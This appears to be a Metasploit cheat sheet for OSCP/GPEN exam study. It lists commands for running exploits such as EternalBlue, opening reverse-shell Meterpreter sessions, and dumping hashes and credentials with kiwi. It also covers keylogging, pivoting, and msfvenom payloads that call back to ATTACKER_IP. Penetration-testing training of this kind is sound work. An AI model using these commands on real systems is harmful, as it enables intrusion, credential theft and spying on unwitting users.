# Metasploit Cheat Sheet (OSCP / GPEN)

This cheat sheet provides a **structured reference for using the Metasploit Framework** during **OSCP and GPEN exams**. Metasploit is used for **exploit development, payload delivery, post-exploitation, and automation**.

Core methodology:

```
Recon → Identify Vulnerability → Search Exploit → Configure Module → Deliver Payload → Post Exploitation
```

---

# 1. Start Metasploit

Start the framework:

```bash
msfconsole
```

Update Metasploit:

```bash
msfupdate
```

---

# 2. Basic Metasploit Commands

| Command | Description |
|--------|-------------|
| `help` | Show help |
| `search` | Search modules |
| `use` | Use module |
| `info` | Module information |
| `show options` | Show module options |
| `set` | Set option |
| `run` / `exploit` | Execute module |
| `back` | Exit module |

Example:

```bash
search smb
```

---

# 3. Searching for Exploits

Search by service:

```bash
search smb
```

Search by CVE:

```bash
search cve:2017
```

Search by platform:

```bash
search type:exploit platform:windows
```

---

# 4. Selecting a Module

Use exploit:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

View module details:

```bash
info
```

---

# 5. Module Options

View required options:

```bash
show options
```

Example output:

```
RHOSTS
LHOST
LPORT
```

Set options:

```bash
set RHOSTS 192.168.1.10
set LHOST 192.168.1.5
set LPORT 4444
```

---

# 6. Running Exploit

Run module:

```bash
exploit
```

Alternative:

```bash
run
```

Run in background:

```bash
exploit -j
```

---

# 7. Payload Selection

Show payloads:

```bash
show payloads
```

Set payload:

```bash
set payload windows/meterpreter/reverse_tcp
```

---

# 8. Meterpreter Basics

Once exploit succeeds, a **Meterpreter session** opens.

Check sessions:

```bash
sessions
```

Interact with session:

```bash
sessions -i 1
```

---

# 9. Meterpreter Commands

| Command | Description |
|--------|-------------|
| `sysinfo` | System information |
| `getuid` | Current user |
| `pwd` | Print working directory |
| `ls` | List files |
| `cd` | Change directory |
| `download` | Download file |
| `upload` | Upload file |

Example:

```bash
sysinfo
getuid
```

---

# 10. File Operations

Download file:

```bash
download file.txt
```

Upload file:

```bash
upload shell.exe
```

---

# 11. Shell Access

Spawn system shell:

```bash
shell
```

Return to meterpreter:

```
CTRL + C
```

---

# 12. Process Management

List processes:

```bash
ps
```

Migrate process:

```bash
migrate PID
```

Migration helps maintain stable sessions.

---

# 13. Privilege Escalation

Check privileges:

```bash
getuid
```

Attempt privilege escalation:

```bash
getsystem
```

---

# 14. Hash Dumping

Dump password hashes:

```bash
hashdump
```

Example output:

```
Administrator:500:hash
```

---

# 15. Credential Harvesting

Dump credentials:

```bash
creds
```

Use mimikatz:

```bash
load kiwi
```

Then:

```bash
creds_all
```

---

# 16. Screenshot Capture

Take screenshot:

```bash
screenshot
```

---

# 17. Keylogging

Start keylogger:

```bash
keyscan_start
```

Stop keylogger:

```bash
keyscan_stop
```

Dump keystrokes:

```bash
keyscan_dump
```

---

# 18. Network Enumeration

Check network interfaces:

```bash
ipconfig
```

View routing table:

```bash
route
```

---

# 19. Port Forwarding

Forward port:

```bash
portfwd add -l 8080 -p 80 -r TARGET_IP
```

---

# 20. Pivoting

Add route:

```bash
route add 192.168.2.0 255.255.255.0 SESSION_ID
```

Scan internal network.

---

# 21. Post Exploitation Modules

List modules:

```bash
search type:post
```

Example:

```bash
use post/windows/gather/hashdump
```

---

# 22. Background Session

Background session:

```
CTRL + Z
```

List sessions:

```bash
sessions
```

---

# 23. Multiple Sessions

Interact with session:

```bash
sessions -i 2
```

Kill session:

```bash
sessions -k 2
```

---

# 24. Database Integration

Initialize database:

```bash
msfdb init
```

Check database:

```bash
db_status
```

---

# 25. Import Nmap Results

Import scan results:

```bash
db_import scan.xml
```

List hosts:

```bash
hosts
```

List services:

```bash
services
```

---

# 26. Auxiliary Modules

Examples:

```
scanner
bruteforce
information gathering
```

Example scan:

```bash
use auxiliary/scanner/smb/smb_version
```

---

# 27. Exploit Suggestions

Use exploit suggester:

```bash
use post/multi/recon/local_exploit_suggester
```

---

# 28. Payload Generation (msfvenom)

Generate payload:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf > shell
```

Windows payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > shell.exe
```

---

# 29. Multi Handler

Start listener:

```bash
use exploit/multi/handler
```

Set payload:

```bash
set payload windows/meterpreter/reverse_tcp
```

Run:

```bash
exploit
```

---

# 30. Metasploit Workflow

```
1. Scan target
2. Identify vulnerability
3. Search exploit
4. Configure module
5. Deliver payload
6. Establish session
7. Perform post exploitation
```

---

# 31. Useful Metasploit Modules

Examples:

```
exploit/windows/smb/ms17_010_eternalblue
exploit/unix/ftp/vsftpd_234_backdoor
exploit/multi/http/tomcat_mgr_upload
```

---

# 32. Final Advice

During OSCP and GPEN exams:

```
Metasploit saves time but manual exploitation is still important.
```

Always:

```
Understand what the exploit does
Enumerate before exploiting
Use Metasploit as a tool, not a crutch
```
